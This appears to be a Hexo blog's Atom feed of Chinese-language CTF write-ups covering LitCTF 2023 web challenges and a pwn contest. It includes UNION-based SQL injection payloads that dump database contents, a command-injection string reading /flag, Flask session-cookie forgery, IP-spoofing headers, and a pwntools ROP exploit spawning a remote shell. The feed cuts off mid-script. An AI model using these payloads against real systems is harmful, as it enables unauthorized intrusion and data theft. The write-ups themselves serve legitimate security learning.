<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>花开再美，怎如初见..?</title>
  
  
  <link href="https://wuming.github.io/atom.xml" rel="self"/>
  
  <link href="https://wuming.github.io/"/>
  <updated>2023-09-22T06:38:00.328Z</updated>
  <id>https://wuming.github.io/</id>
  
  <author>
    <name>wuming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web入门记录</title>
    <link href="https://wuming.github.io/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://wuming.github.io/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2023-09-21T05:45:27.000Z</published>
    <updated>2023-09-22T06:38:00.328Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg"></p><span id="more"></span> <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><a href="https://blog.csdn.net/A951860555/article/details/116484328">SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客</a></p><p><a href="">浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客</a></p><p>SQL中的select语句，select语句是SQL中的查询语句，用于从数据库中查询数据，并且返回给用户。<br>它的简单用法是这样的：<strong>select 字段名1,字段名2…字段名n from</strong> 表名当然，你也可以同时指定数据库名及表名，具体用法是用一个点号连接数据库名和表名，例子：select 字段名1,字段名2…字段名n from 数据库名.表名</p><p>联合查询：<br>    格式：<strong>select 字段名1,字段名2…字段名n from 表名1 union select 字段名1,字段名2…字段名n from 表名2</strong><br>    作用：联合查询用于合并两个或多个 SELECT 语句的结果集<br>    注意：</p><pre><code>    1. 每个 SELECT 语句必须拥有相同数量的列    2. 列必须拥有相似的数据类型（相似的意思是：有些数据类型间可以互相转化，比如数字字符串和数字。这就叫相似，相似就行，不是必须一模一样）    3. 每个 SELECT 语句中的列的顺序必须相同</code></pre><p>记录一种做题方法</p><p>题目来源 Litctf sql注入</p><p>1.先判断显示位，payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>)))))) union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2.爆库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure><p>1&#x3D;2的目的是使得条件为假</p><p>3.得到库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,ctftraining,performance_schema,test,ctf</span><br></pre></td></tr></table></figure><p>4.爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctf&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>5.得到表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users</span><br></pre></td></tr></table></figure><p>6.爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>7.得到列名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></pre></td></tr></table></figure><p>8.获取值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#</span><br></pre></td></tr></table></figure><p>9.获得彩蛋（难蚌）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OHHHHHHH,F1rst_to_Th3_eggggggggg!&#125; </span><br></pre></td></tr></table></figure><p>flag同理，去爆ctftraining即可</p><p>10.重新爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctftraining&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>11.得到表明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,news,users</span><br></pre></td></tr></table></figure><p>12.重新爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;flag&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>13.获得列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure><p>14.重新获取值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="Web" scheme="https://wuming.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>litctf</title>
    <link href="https://wuming.github.io/2023/09/19/litctf/"/>
    <id>https://wuming.github.io/2023/09/19/litctf/</id>
    <published>2023-09-19T08:45:20.000Z</published>
    <updated>2023-09-22T13:43:42.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h2><p>打开环境后，直接F12就可以看到flag</p><p>同时打开源码的方式还有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f12/ctrl+u/view-source：</span><br></pre></td></tr></table></figure><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp"></p><span id="more"></span> <h2 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h2><p>打开页面，猜测命令执行</p><p>system(“ls &#x2F;“); 查看目录文件夹，看到flag文件直接查看即可</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4m4th4lnkqg0.png"></p><h2 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a>[LitCTF 2023]就当无事发生</h2><p>首先去探姬的github，然后直接搜索他的博客地址</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/0bc762429c6478832b423983f5f49c8e.2fr8flw6sa80.webp"></p><p>随后直接点击这个按钮，可以查看作者对文件的更改</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2r551bvk57c0.webp"></p><p>最后在里面找到带有X号的，就是作者删除过的，或者点上面的√可以看到作者的更改</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B7E1532FA-9E7A-4e87-A5FE-C4EB552A98AF%7D.112w5kxubstc.webp"></p><h2 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a>[LitCTF 2023]Follow me and hack me</h2><p>直接hackar进行传参</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/8160496c03f53fa83615d0212465ef11.12lqjzm7lqf4.webp"></p><h2 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h2><p>vim泄露，原理就是在你编辑vim文档的时候，如果需要特殊情况关闭了，他会生成一个xxxx.swp，后续是xxxx.swo，他是可以被扫描出来的，此时你就可以使用命令来恢复他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r xxx.swp</span><br></pre></td></tr></table></figure><p>比如我 vim 1.php 但是我中通关闭了他，那天就会产生这个文件，只需要r一下就可以恢复</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/15250cfd706242cbaf0aa0e5a8f97bab.67gq0p6qvn40.webp"></p><p>回到题目，首先下载下这个文件，然后去kali将文件恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28647/.index.php.swp</span><br></pre></td></tr></table></figure><p>此时我们就已知了他的php代码</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6pidz6qpuog0.webp"></p><p>代码的逻辑很简单，就是post传参一个base64加密后的’Give_Me_You_Flag’</p><p>然后传入一个名为cmd的参数，因为外包裹着eval，所以我们可以执行命令</p><p>可以用burp进行抓包操作得到flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.28caqntwhedc.webp"></p><h2 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h2><p><a href="https://www.bilibili.com/video/BV1ZR4y1Y745/?spm_id_from=333.880.my_history.page.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18">SQL注入攻击原理，方法和类型_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/A951860555/article/details/116484328">SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客</a></p><p>作为一个新手web，看了一天，看不懂一点，所以直接记套题，后续慢慢了解</p><p>但我可以解释一下每个命令的作用</p><p>首先先id&#x3D;1，先判断是字符型注入还是整形注入</p><p>id&#x3D;1回显就是整形</p><p>id&#x3D;’1‘回显就是字符型</p><p>可以看到id&#x3D;1时有回显，我们判断他是整形注入</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2pssl53e6kq0.webp"></p><p><a href="https://blog.csdn.net/qq_23667585/article/details/127213099">浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客</a></p><p>1.先判断显示位，payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>)))))) union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>第一句就有很多问题，详细可以参考上述的文章，wp参考</p><p>[<a href="https://blog.csdn.net/Leaf_initial/article/details/130671885">LitCTF2023] web方向全题解wp_Leafzzz__的博客-CSDN博客</a></p><p>2.爆库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure><p>1&#x3D;2的目的是使得条件为假,经过我的实验使用id&#x3D;-1)))))) union…同理，所以这俩的作用都是表示判断错误，不显示第一个数据库，显示第二个</p><p>3.得到库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,ctftraining,performance_schema,test,ctf</span><br></pre></td></tr></table></figure><p>4.爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctf&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>5.得到表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users</span><br></pre></td></tr></table></figure><p>6.爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>7.得到列名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></pre></td></tr></table></figure><p>8.获取值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#</span><br></pre></td></tr></table></figure><p>9.获得彩蛋（难蚌）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OHHHHHHH,F1rst_to_Th3_eggggggggg!&#125; </span><br></pre></td></tr></table></figure><p>flag同理，去爆ctftraining即可</p><p>10.重新爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctftraining&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>11.得到表明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,news,users</span><br></pre></td></tr></table></figure><p>12.重新爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;flag&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>13.获得列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure><p>14.重新获取值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2vs4use82qa0.webp"></p><h4 id="webshell：需要上传木马以及蚁剑的使用"><a href="#webshell：需要上传木马以及蚁剑的使用" class="headerlink" title="webshell：需要上传木马以及蚁剑的使用"></a>webshell：需要上传木马以及蚁剑的使用</h4><p>大马，小马，一句话木马等，上传后使用蚁剑进行连接</p><p><a href="https://www.bilibili.com/video/BV1Wk4y1m7fp/?spm_id_from=333.337.search-card.all.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18">如何使用中国蚁剑连接webshell？_哔哩哔哩_bilibili</a></p><h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>和http请求头有关的题目，详细可以在下面的网站了解</p><p><a href="https://developer.mozilla.org/zh-CN/docs/web/http/headers">HTTP 标头（header） - HTTP | MDN (mozilla.org)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Requested-With: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Proto: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-addr: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Ali-CDN-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Src-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Real-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">CF-Connecting-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Cluster-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">WL-Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Fastly-Client-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Originating-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Custom-IP-Authorization: <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>本机地址client-ip: 127.0.0.1</p><p>访问网站referer: pornhub.com</p><p>指定浏览器user-agent: Chrome</p><p>使用代理via: Clash.win</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.73yrqln52y00.webp"></p><p>到达这个页面后，直接去源码查看就可以看到flag所在的地方</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xfl93ctnwu0.webp"></p><h2 id="LitCTF-2023-1zjs"><a href="#LitCTF-2023-1zjs" class="headerlink" title="[LitCTF 2023]1zjs"></a>[LitCTF 2023]1zjs</h2><p>直接去源代码区域，找到js源码，可以发现一个php，里面有很多jsfuck的文字，直接去解密就行</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1rcn1dvd618g.webp"></p><p>因为是js，可以在控制台直接输出</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4yqn0mb2fi00.webp"></p><h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p>session伪造的题目</p><p>我们可以先尝试输入文字然后回车，到后面获取flag，然后他提示我们需要管理员才能获取flag</p><p>通过burp抓包我们可以看到有一段cookie被返回，题目的要求是只有管理员才能拿flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.61623zag7co0.png"></p><p>session伪造需要一个key，一般的题目中key是需要在题目中找的，但是这个题目的key是猜的，key&#x3D;’litctf’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解码：python3  flask_session_cookie_manager3.py decode -s <span class="string">&quot;密钥&quot;</span> -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">加密：python3  flask_session_cookie_manager3.py encode -s <span class="string">&quot;密钥&quot;</span> -t <span class="string">&quot;上面解密出的一串字符串&quot;</span></span><br></pre></td></tr></table></figure><p>我们获取了key后可以先去解密一下，我们发现解密后他的请求name为’111’,根据题目我们修改成’admin’，就可以了</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.27nvnjo9nyo0.webp"></p><p>我们使用burp发送过去就可以获得flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2eee9dgxxog0.webp"></p><h2 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h2><p>我们首先可以看到源码，里面有个正则</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.64n0c8tf0240.webp"></p><p>所以我们有两个方式，第一个就是直接禁用JavaScript即可</p><p>F12+F1 禁用后直接 1.1.1.1 || （ls &#x2F;）(cat &#x2F;flag) 即可</p><p>同时这里就涉及了一个知识点就是linux的管道命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#x27;1‘ &amp;&amp; echo &#x27;2&#x27;    </span><br><span class="line"></span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#x27;yes&#x27; | wc -l</span><br><span class="line"></span><br><span class="line">|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fx5n2h64yo0.webp"></p><p>第二个方法就是使用burp进行抓包，抓到后之间在内部进行修改</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1g5mkbhr9g5c.webp"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;LitCTF-2023-我Flag呢？&quot;&gt;&lt;a href=&quot;#LitCTF-2023-我Flag呢？&quot; class=&quot;headerlink&quot; title=&quot;[LitCTF 2023]我Flag呢？&quot;&gt;&lt;/a&gt;[LitCTF 2023]我Flag呢？&lt;/h2&gt;&lt;p&gt;打开环境后，直接F12就可以看到flag&lt;/p&gt;
&lt;p&gt;同时打开源码的方式还有&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;f12/ctrl+u/view-source：&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/%7B4038CD4C-5AD6-45cc-B79F-734765D74244%7D.74m3u0jfzps0.webp&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="Pwn" scheme="https://wuming.github.io/tags/Pwn/"/>
    
    <category term="RE" scheme="https://wuming.github.io/tags/RE/"/>
    
    <category term="litctf" scheme="https://wuming.github.io/tags/litctf/"/>
    
    <category term="WEB" scheme="https://wuming.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>山石结营赛</title>
    <link href="https://wuming.github.io/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/"/>
    <id>https://wuming.github.io/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/</id>
    <published>2023-08-19T16:15:19.000Z</published>
    <updated>2023-08-19T17:21:58.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x40072b</span></span><br><span class="line">rsi = <span class="number">0x400735</span></span><br><span class="line">rax = <span class="number">0x400721</span></span><br><span class="line">syscall = <span class="number">0x400741</span></span><br><span class="line">rdx = <span class="number">0x40073f</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">b&#x27;a&#x27;</span>+ p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(<span class="number">0x601048</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><span id="more"></span> <h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 